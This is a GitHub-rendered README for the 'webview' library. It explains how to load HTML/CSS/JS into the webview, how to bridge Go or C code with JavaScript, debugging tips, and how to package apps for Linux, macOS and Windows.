&lt;h3&gt;&lt;a id="user-content-how-to-serve-or-inject-the-initial-htmlcssjavascript-into-the-webview" class="anchor" aria-hidden="true" href="#how-to-serve-or-inject-the-initial-htmlcssjavascript-into-the-webview"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to serve or inject the initial HTML/CSS/JavaScript into the webview?&lt;/h3&gt;
&lt;p&gt;First of all, you probably want to embed your assets (HTML/CSS/JavaScript) into the binary to have a standalone executable. Consider using &lt;a href="https://github.com/go-bindata/go-bindata"&gt;go-bindata&lt;/a&gt; or any other similar tools.&lt;/p&gt;
&lt;p&gt;Now there are two major approaches to deploy the content:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Serve HTML/CSS/JS with an embedded HTTP server&lt;/li&gt;
&lt;li&gt;Injecting HTML/CSS/JS via the JavaScript binding API&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To serve the content it is recommended to use ephemeral ports:&lt;/p&gt;
&lt;div class="highlight highlight-source-go"&gt;&lt;pre&gt;&lt;span class="pl-smi"&gt;ln&lt;/span&gt;, &lt;span class="pl-smi"&gt;err&lt;/span&gt; &lt;span class="pl-k"&gt;:=&lt;/span&gt; net.&lt;span class="pl-c1"&gt;Listen&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;tcp&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;127.0.0.1:0&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;)
&lt;span class="pl-k"&gt;if&lt;/span&gt; err != &lt;span class="pl-c1"&gt;nil&lt;/span&gt; {
	log.&lt;span class="pl-c1"&gt;Fatal&lt;/span&gt;(err)
}
&lt;span class="pl-k"&gt;defer&lt;/span&gt; ln.&lt;span class="pl-c1"&gt;Close&lt;/span&gt;()
&lt;span class="pl-k"&gt;go&lt;/span&gt; &lt;span class="pl-k"&gt;func&lt;/span&gt;() {
 	&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; Set up your http server here&lt;/span&gt;
	log.&lt;span class="pl-c1"&gt;Fatal&lt;/span&gt;(http.&lt;span class="pl-c1"&gt;Serve&lt;/span&gt;(ln, &lt;span class="pl-c1"&gt;nil&lt;/span&gt;))
}()
webview.&lt;span class="pl-c1"&gt;Open&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Hello&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;http://&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;+ln.&lt;span class="pl-c1"&gt;Addr&lt;/span&gt;().&lt;span class="pl-c1"&gt;String&lt;/span&gt;(), &lt;span class="pl-c1"&gt;400&lt;/span&gt;, &lt;span class="pl-c1"&gt;300&lt;/span&gt;, &lt;span class="pl-c1"&gt;false&lt;/span&gt;)&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Injecting the content via JS bindings is a bit more complicated, but feels more solid and does not expose any additional open TCP ports.&lt;/p&gt;
&lt;p&gt;Leave &lt;code&gt;webview.Settings.URL&lt;/code&gt; empty to start with bare minimal HTML5. It will open a webview with &lt;code&gt;&amp;lt;div id="app"&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt; in it. Alternatively, use a data URI to inject custom HTML code (don't forget to URL-encode it):&lt;/p&gt;
&lt;div class="highlight highlight-source-go"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;const&lt;/span&gt; myHTML = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;`&lt;/span&gt;&amp;lt;!doctype html&amp;gt;&amp;lt;html&amp;gt;....&amp;lt;/html&amp;gt;&lt;span class="pl-pds"&gt;`&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-smi"&gt;w&lt;/span&gt; &lt;span class="pl-k"&gt;:=&lt;/span&gt; webview.&lt;span class="pl-c1"&gt;New&lt;/span&gt;(webview.&lt;span class="pl-smi"&gt;Settings&lt;/span&gt;{
	&lt;span class="pl-v"&gt;URL&lt;/span&gt;: &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;`&lt;/span&gt;data:text/html,&lt;span class="pl-pds"&gt;`&lt;/span&gt;&lt;/span&gt; + url.&lt;span class="pl-c1"&gt;PathEscape&lt;/span&gt;(myHTML),
})&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Keep your initial HTML short (a few kilobytes maximum).&lt;/p&gt;
&lt;p&gt;Now you can inject more JavaScript once the webview becomes ready using &lt;code&gt;webview.Eval()&lt;/code&gt;. You can also inject CSS styles using JavaScript:&lt;/p&gt;
&lt;div class="highlight highlight-source-go"&gt;&lt;pre&gt;w.&lt;span class="pl-c1"&gt;Dispatch&lt;/span&gt;(&lt;span class="pl-k"&gt;func&lt;/span&gt;() {
	&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; Inject CSS&lt;/span&gt;
	w.&lt;span class="pl-c1"&gt;Eval&lt;/span&gt;(fmt.&lt;span class="pl-c1"&gt;Sprintf&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;`&lt;/span&gt;(function(css){&lt;/span&gt;
&lt;span class="pl-s"&gt;		var style = document.createElement('style');&lt;/span&gt;
&lt;span class="pl-s"&gt;		var head = document.head || document.getElementsByTagName('head')[0];&lt;/span&gt;
&lt;span class="pl-s"&gt;		style.setAttribute('type', 'text/css');&lt;/span&gt;
&lt;span class="pl-s"&gt;		if (style.styleSheet) {&lt;/span&gt;
&lt;span class="pl-s"&gt;			style.styleSheet.cssText = css;&lt;/span&gt;
&lt;span class="pl-s"&gt;		} else {&lt;/span&gt;
&lt;span class="pl-s"&gt;			style.appendChild(document.createTextNode(css));&lt;/span&gt;
&lt;span class="pl-s"&gt;		}&lt;/span&gt;
&lt;span class="pl-s"&gt;		head.appendChild(style);&lt;/span&gt;
&lt;span class="pl-s"&gt;	})("%s")&lt;span class="pl-pds"&gt;`&lt;/span&gt;&lt;/span&gt;, template.&lt;span class="pl-c1"&gt;JSEscapeString&lt;/span&gt;(myStylesCSS)))
	&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; Inject JS&lt;/span&gt;
	w.&lt;span class="pl-c1"&gt;Eval&lt;/span&gt;(myJSFramework)
	w.&lt;span class="pl-c1"&gt;Eval&lt;/span&gt;(myAppJS)
})&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This works fairly well across the platforms, see &lt;code&gt;counter-go&lt;/code&gt; example for more details about how make a webview app with no web server. It also demonstrates how to use ReactJS, VueJS or Picodom with webview.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-how-to-communicate-between-native-go-and-web-ui" class="anchor" aria-hidden="true" href="#how-to-communicate-between-native-go-and-web-ui"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to communicate between native Go and web UI?&lt;/h3&gt;
&lt;p&gt;You already have seen how to use &lt;code&gt;w.Eval()&lt;/code&gt; to run JavaScript inside the webview. There is also a way to call Go code from JavaScript.&lt;/p&gt;
&lt;p&gt;On the low level there is a special callback, &lt;code&gt;webview.Settings.ExternalInvokeCallback&lt;/code&gt; that receives a string argument. This string can be passed from JavaScript using &lt;code&gt;window.external.invoke(someString)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This might seem very inconvenient, and that is why there is a dedicated &lt;code&gt;webview.Bind()&lt;/code&gt; API call. It binds an existing Go object (struct or struct pointer) and creates/injects JS API for it. Now you can call JS methods and they will result in calling native Go methods. Even more, if you modify the Go object - it can be automatically serialized to JSON and passed to the web UI to keep things in sync.&lt;/p&gt;
&lt;p&gt;Please, see &lt;code&gt;counter-go&lt;/code&gt; example for more details about how to bind Go controllers to the web UI.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-debugging-and-development-tips" class="anchor" aria-hidden="true" href="#debugging-and-development-tips"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Debugging and development tips&lt;/h2&gt;
&lt;p&gt;If terminal output is unavailable (e.g. if you launch app bundle on MacOS or
GUI app on Windows) you may use &lt;code&gt;webview.Debug()&lt;/code&gt; and &lt;code&gt;webview.Debugf()&lt;/code&gt; to
print logs. On MacOS such logs will be printed via NSLog and can be seen in the
&lt;code&gt;Console&lt;/code&gt; app. On Windows they use &lt;code&gt;OutputDebugString&lt;/code&gt; and can be seen using
&lt;code&gt;DebugView&lt;/code&gt; app. On Linux logging is done to stderr and can be seen in the
terminal or redirected to a file.&lt;/p&gt;
&lt;p&gt;To debug the web part of your app you may use &lt;code&gt;webview.Settings.Debug&lt;/code&gt; flag. It
enables the Web Inspector in WebKit and works on Linux and MacOS (use popup menu
to open the web inspector). On Windows there is no easy to way to enable
debugging, but you may include Firebug in your HTML code:&lt;/p&gt;
&lt;div class="highlight highlight-text-html-basic"&gt;&lt;pre&gt;&amp;lt;&lt;span class="pl-ent"&gt;script&lt;/span&gt; &lt;span class="pl-e"&gt;type&lt;/span&gt;=&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;text/javascript&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-e"&gt;src&lt;/span&gt;=&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;https://getfirebug.com/firebug-lite.js&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span class="pl-ent"&gt;script&lt;/span&gt;&amp;gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Even though Firebug browser extension development has been stopped, Firebug
Lite is still available and just works.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-distributing-webview-apps" class="anchor" aria-hidden="true" href="#distributing-webview-apps"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Distributing webview apps&lt;/h2&gt;
&lt;p&gt;On Linux you get a standalone executable. It will depend on GTK3 and GtkWebkit2, so if you distribute your app in DEB or RPM format include those dependencies. An application icon can be specified by providing a &lt;code&gt;.desktop&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;On MacOS you are likely to ship an app bundle. Make the following directory structure and just zip it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;example.app
└── Contents
    ├── Info.plist
    ├── MacOS
    |   └── example
    └── Resources
        └── example.icns
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here, &lt;code&gt;Info.plist&lt;/code&gt; is a &lt;a href="https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/AboutInformationPropertyListFiles.html" rel="nofollow"&gt;property list file&lt;/a&gt; and &lt;code&gt;*.icns&lt;/code&gt; is a special icon format. You may convert PNG to icns &lt;a href="https://iconverticons.com/online/" rel="nofollow"&gt;online&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;On Windows you probably would like to have a custom icon for your executable. It can be done by providing a resource file, compiling it and linking with it. Typically, &lt;code&gt;windres&lt;/code&gt; utility is used to compile resources.&lt;/p&gt;
&lt;p&gt;You may find some example build scripts for all three platforms &lt;a href="https://github.com/naivesound/glitch/tree/master/dist"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Also, if you want to cross-compile your webview app - use &lt;a href="https://github.com/karalabe/xgo"&gt;xgo&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-webview-for-cc-developers" class="anchor" aria-hidden="true" href="#webview-for-cc-developers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Webview for C/C++ developers&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-getting-started-1" class="anchor" aria-hidden="true" href="#getting-started-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting started&lt;/h3&gt;
&lt;p&gt;Download &lt;a href="https://raw.githubusercontent.com/zserge/webview/master/webview.h" rel="nofollow"&gt;webview.h&lt;/a&gt; and include it in your C/C++ code:&lt;/p&gt;
&lt;div class="highlight highlight-source-c"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; main.c&lt;/span&gt;
#&lt;span class="pl-k"&gt;define&lt;/span&gt; &lt;span class="pl-en"&gt;WEBVIEW_IMPLEMENTATION&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt;don't forget to define WEBVIEW_WINAPI,WEBVIEW_GTK or WEBVIEW_COCAO&lt;/span&gt;
#&lt;span class="pl-k"&gt;include&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;webview.h&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;

#&lt;span class="pl-k"&gt;ifdef&lt;/span&gt; WIN32
&lt;span class="pl-k"&gt;int&lt;/span&gt; WINAPI &lt;span class="pl-en"&gt;WinMain&lt;/span&gt;(HINSTANCE hInt, HINSTANCE hPrevInst, LPSTR lpCmdLine,
                   &lt;span class="pl-k"&gt;int&lt;/span&gt; nCmdShow) {
#&lt;span class="pl-k"&gt;else&lt;/span&gt;
&lt;span class="pl-k"&gt;int&lt;/span&gt; &lt;span class="pl-smi"&gt;main&lt;/span&gt;() {
#endif
  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; Open wikipedia in a 800x600 resizable window &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-c1"&gt;webview&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Minimal webview example&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
	  &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;https://en.m.wikipedia.org/wiki/Main_Page&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-c1"&gt;800&lt;/span&gt;, &lt;span class="pl-c1"&gt;600&lt;/span&gt;, &lt;span class="pl-c1"&gt;1&lt;/span&gt;);
  &lt;span class="pl-k"&gt;return&lt;/span&gt; &lt;span class="pl-c1"&gt;0&lt;/span&gt;;
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Build it:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Linux&lt;/span&gt;
$ gcc main.c -DWEBVIEW_GTK=1 &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;`&lt;/span&gt;pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.0&lt;span class="pl-pds"&gt;`&lt;/span&gt;&lt;/span&gt; -o webview-example
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; MacOS&lt;/span&gt;
$ gcc main.c -DWEBVIEW_COCOA=1 -framework WebKit -o webview-example
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Windows (mingw)&lt;/span&gt;
$ cc main.c -DWEBVIEW_WINAPI=1 -lole32 -lcomctl32 -loleaut32 -luuid -mwindows -o webview-example.exe
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Windows (cl)&lt;/span&gt;
$ cl main.c /D WEBVIEW_WINAPI=1 /link ole32.lib comctl32.lib oleaut32.lib uuid.lib gdi32.lib advapi32.lib&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-api-1" class="anchor" aria-hidden="true" href="#api-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;API&lt;/h3&gt;
&lt;p&gt;For the most simple use cases there is only one function:&lt;/p&gt;
&lt;div class="highlight highlight-source-c"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;int&lt;/span&gt; &lt;span class="pl-en"&gt;webview&lt;/span&gt;(&lt;span class="pl-k"&gt;const&lt;/span&gt; &lt;span class="pl-k"&gt;char&lt;/span&gt; *title, &lt;span class="pl-k"&gt;const&lt;/span&gt; &lt;span class="pl-k"&gt;char&lt;/span&gt; *url, &lt;span class="pl-k"&gt;int&lt;/span&gt; width, &lt;span class="pl-k"&gt;int&lt;/span&gt; height, &lt;span class="pl-k"&gt;int&lt;/span&gt; resizable);&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The following URL schemes are supported:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://&lt;/code&gt; and &lt;code&gt;https://&lt;/code&gt;, no surprises here.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file:///&lt;/code&gt; can be useful if you want to unpack HTML/CSS assets to some
temporary directory and point a webview to open index.html from there.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data:text/html,&amp;lt;html&amp;gt;...&amp;lt;/html&amp;gt;&lt;/code&gt; allows to pass short HTML data inline
without using a web server or polluting the file system. Further
modifications of the webview contents can be done via JavaScript bindings.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If have chosen a regular http URL scheme, you can use Mongoose or any other web server/framework you like.&lt;/p&gt;
&lt;p&gt;If you want to have more control over the app lifecycle you can use the following functions:&lt;/p&gt;
&lt;div class="highlight highlight-source-c"&gt;&lt;pre&gt;  &lt;span class="pl-k"&gt;struct&lt;/span&gt; webview webview = {
      .&lt;span class="pl-smi"&gt;title&lt;/span&gt; = title,
      .&lt;span class="pl-smi"&gt;url&lt;/span&gt; = url,
      .&lt;span class="pl-smi"&gt;width&lt;/span&gt; = w,
      .&lt;span class="pl-smi"&gt;height&lt;/span&gt; = h,
      .&lt;span class="pl-smi"&gt;debug&lt;/span&gt; = debug,
      .&lt;span class="pl-smi"&gt;resizable&lt;/span&gt; = resizable,
  };
  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; Create webview window using the provided options &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-en"&gt;webview_init&lt;/span&gt;(&amp;amp;webview);
  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; Main app loop, can be either blocking or non-blocking &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-k"&gt;while&lt;/span&gt; (webview_loop(&amp;amp;webview, blocking) == &lt;span class="pl-c1"&gt;0&lt;/span&gt;);
  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; Destroy webview window, often exits the app &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-en"&gt;webview_exit&lt;/span&gt;(&amp;amp;webview);

  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; To change window title later: &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-en"&gt;webview_set_title&lt;/span&gt;(&amp;amp;webview, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;New title&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;);

  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; To terminate the webview main loop: &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-en"&gt;webview_terminate&lt;/span&gt;(&amp;amp;webview);

  &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; To print logs to stderr, MacOS Console or DebugView: &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-en"&gt;webview_debug&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;exited: &lt;span class="pl-c1"&gt;%d&lt;/span&gt;&lt;span class="pl-cce"&gt;\n&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-c1"&gt;1&lt;/span&gt;);&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To evaluate arbitrary JavaScript code use the following C function:&lt;/p&gt;
&lt;div class="highlight highlight-source-c"&gt;&lt;pre&gt;&lt;span class="pl-en"&gt;webview_eval&lt;/span&gt;(&amp;amp;webview, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;alert('hello, world');&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;);&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There is also a special callback (&lt;code&gt;webview.external_invoke_cb&lt;/code&gt;) that can be invoked from JavaScript:&lt;/p&gt;
&lt;div class="highlight highlight-source-js"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; C&lt;/span&gt;
&lt;span class="pl-k"&gt;void&lt;/span&gt; &lt;span class="pl-en"&gt;my_cb&lt;/span&gt;(&lt;span class="pl-smi"&gt;struct&lt;/span&gt; &lt;span class="pl-smi"&gt;webview&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt;&lt;span class="pl-smi"&gt;w&lt;/span&gt;, &lt;span class="pl-k"&gt;const&lt;/span&gt; &lt;span class="pl-c1"&gt;char&lt;/span&gt; *&lt;span class="pl-c1"&gt;arg&lt;/span&gt;) {
	&lt;span class="pl-k"&gt;...&lt;/span&gt;
}

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; JS&lt;/span&gt;
&lt;span class="pl-c1"&gt;window&lt;/span&gt;.&lt;span class="pl-c1"&gt;external&lt;/span&gt;.&lt;span class="pl-en"&gt;invoke&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;some arg&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;);
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; Exactly one string argument must be provided, to pass more complex objects&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; serialize them to JSON and parse it in C. To pass binary data consider using&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; base64.&lt;/span&gt;
&lt;span class="pl-c1"&gt;window&lt;/span&gt;.&lt;span class="pl-c1"&gt;external&lt;/span&gt;.&lt;span class="pl-en"&gt;invoke&lt;/span&gt;(&lt;span class="pl-c1"&gt;JSON&lt;/span&gt;.&lt;span class="pl-c1"&gt;stringify&lt;/span&gt;({fn&lt;span class="pl-k"&gt;:&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;sum&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;, x&lt;span class="pl-k"&gt;:&lt;/span&gt; &lt;span class="pl-c1"&gt;5&lt;/span&gt;, y&lt;span class="pl-k"&gt;:&lt;/span&gt; &lt;span class="pl-c1"&gt;3&lt;/span&gt;}));&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Webview library is meant to be used from a single UI thread only. So if you
want to call &lt;code&gt;webview_eval&lt;/code&gt; or &lt;code&gt;webview_terminate&lt;/code&gt; from some background thread&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;you have to use &lt;code&gt;webview_dispatch&lt;/code&gt; to post some arbitrary function with some
context to be executed inside the main UI thread:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-c"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; This function will be executed on the UI thread&lt;/span&gt;
&lt;span class="pl-k"&gt;void&lt;/span&gt; &lt;span class="pl-en"&gt;render&lt;/span&gt;(&lt;span class="pl-k"&gt;struct&lt;/span&gt; webview *w, &lt;span class="pl-k"&gt;void&lt;/span&gt; *arg) {
  &lt;span class="pl-c1"&gt;webview_eval&lt;/span&gt;(w, ......);
}

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; Dispatch render() function from another thread:&lt;/span&gt;
&lt;span class="pl-en"&gt;webview_dispatch&lt;/span&gt;(w, render, some_arg);&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You may find some C/C++ examples in this repo that demonstrate the API above.&lt;/p&gt;
